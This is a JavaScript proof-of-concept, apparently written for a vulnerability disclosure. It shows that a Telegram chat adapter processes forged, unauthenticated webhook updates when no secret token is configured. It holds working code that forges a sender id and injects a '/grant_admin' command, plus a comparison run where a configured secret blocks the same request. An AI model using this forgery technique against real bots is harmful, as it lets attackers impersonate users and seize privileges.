// PoC — @chat-adapter/telegram processes UNAUTHENTICATED, attacker-forged webhook
// updates when no secret token is configured (CWE-306, Missing Authentication).
//
// The bot's public webhook route (a Next.js/HTTP handler wired to
// `chat.webhooks.telegram`, conventionally `POST /api/webhooks/telegram`) accepts
// a request body as a genuine Telegram Update. With no `secretToken` configured,
// `handleWebhook` (dist/index.js:1041) only logs a warning and calls
// `processUpdate(update)` — so an attacker who reaches the URL injects messages
// that appear to come from ANY Telegram user (forged `from.id`, `chat.id`, text,
// commands). Every other adapter in this SDK refuses unverified webhooks
// (Slack/Messenger throw without a secret; WhatsApp/Twilio 401 without a signature).
//
// This PoC runs entirely locally against the published packages. It makes NO real
// network calls: global fetch is stubbed to fail-fast on api.telegram.org so the
// optional bot-identity lookup during init is skipped (it is irrelevant to the
// fail-open path). Nothing is sent to Telegram or Vercel.

import { createMemoryState } from "@chat-adapter/state-memory";
import { createTelegramAdapter } from "@chat-adapter/telegram";
import { Chat } from "chat";

// --- keep the PoC fully offline: no request ever leaves the machine ----------
const realFetch = globalThis.fetch;
globalThis.fetch = async (url, init) => {
  const u = String(typeof url === "object" && url ? url.url : url);
  if (u.includes("api.telegram.org")) {
    throw new Error("[poc] outbound Telegram API call blocked (offline PoC)");
  }
  return realFetch(url, init);
};

const quietLogger = {
  debug() {}, info() {}, warn() {}, error() {},
  child() { return quietLogger; },
};

// A forged Telegram Update. NONE of this is authenticated — the attacker picks
// every value: the sender's user id, the chat, and the text/command.
function forgedUpdate({ fromId, text }) {
  return {
    update_id: Math.floor(1e8 + Math.random() * 1e8),
    message: {
      message_id: 1,
      from: { id: fromId, is_bot: false, first_name: "Attacker", username: "attacker" },
      chat: { id: fromId, first_name: "Attacker", username: "attacker", type: "private" },
      date: 1690000000,
      text,
    },
  };
}

function webhookRequest(update, { secretHeader } = {}) {
  const headers = { "content-type": "application/json" };
  if (secretHeader !== undefined) headers["x-telegram-bot-api-secret-token"] = secretHeader;
  return new Request("https://victim-bot.example.com/api/webhooks/telegram", {
    method: "POST",
    headers,
    body: JSON.stringify(update),
  });
}

// Build a bot exactly as the docs' minimal setup shows, optionally with a secret.
function buildBot({ secretToken } = {}) {
  const received = [];
  const telegram = createTelegramAdapter({
    botToken: "0000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", // dummy; never used (offline)
    mode: "webhook",
    logger: quietLogger,
    ...(secretToken ? { secretToken } : {}),
  });
  const chat = new Chat({
    userName: "victimbot",
    adapters: { telegram },
    state: createMemoryState(),
    logger: quietLogger,
  });
  const record = (thread, message) => {
    received.push({
      text: message?.text,
      senderId: message?.raw?.from?.id ?? message?.user?.userId,
    });
  };
  chat.onNewMention(async (t, m) => record(t, m));
  chat.onNewMessage(/[\s\S]*/, async (t, m) => record(t, m));
  chat.onSubscribedMessage(async (t, m) => record(t, m));
  return { chat, received };
}

async function deliver(chat, request) {
  // chat.webhooks.<adapter> is the framework's public HTTP entry point — the exact
  // function an app mounts at POST /api/webhooks/telegram.
  const res = await chat.webhooks.telegram(request);
  // handleWebhook returns 200 immediately; processUpdate runs async — let it settle.
  await new Promise((r) => setTimeout(r, 150));
  return res;
}

console.log("=== PoC: Telegram webhook auth bypass (fail-open, no secret_token) ===");
console.log("packages: chat@4.38.1, @chat-adapter/telegram@4.38.1 (published)\n");

// ---------------------------------------------------------------------------
// SCENARIO A — the documented minimal setup (no secretToken): FAIL-OPEN
// ---------------------------------------------------------------------------
{
  const { chat, received } = buildBot(); // no secret — matches `createTelegramAdapter({ botToken })`
  const update = forgedUpdate({ fromId: 1337421337, text: "/grant_admin @attacker  <-- forged, unauthenticated" });
  const res = await deliver(chat, webhookRequest(update)); // NO secret header
  console.log("[A] no secretToken configured; attacker POSTs a forged update with NO auth header");
  console.log("    HTTP response:", res.status, JSON.stringify(await res.text()));
  if (received.length > 0) {
    console.log("    >> HANDLER FIRED — unauthenticated message was injected into the bot:");
    console.log("       forged senderId:", received[0].senderId, "| text:", JSON.stringify(received[0].text));
    console.log("    >> VULNERABLE: attacker impersonated Telegram user", received[0].senderId, "with no credentials.\n");
  } else {
    console.log("    >> handler did NOT fire (unexpected)\n");
  }
  await chat.shutdown();
}

// ---------------------------------------------------------------------------
// SCENARIO B — same request, but a secretToken IS configured: FAIL-CLOSED
// ---------------------------------------------------------------------------
{
  const { chat, received } = buildBot({ secretToken: "correct-horse-battery-staple" });
  const update = forgedUpdate({ fromId: 1337421337, text: "/grant_admin @attacker  <-- forged" });
  const res = await deliver(chat, webhookRequest(update)); // still NO secret header
  console.log("[B] secretToken configured; same forged request with NO secret header");
  console.log("    HTTP response:", res.status, JSON.stringify(await res.text()));
  console.log("    >> handler fired:", received.length > 0 ? "YES (bad)" : "NO — request correctly rejected (401).\n");
  await chat.shutdown();
}

console.log("Conclusion: without secret_token the bot processes attacker-forged updates as genuine.");
console.log("Every other adapter in this SDK refuses unverified webhooks; Telegram alone fails open.");
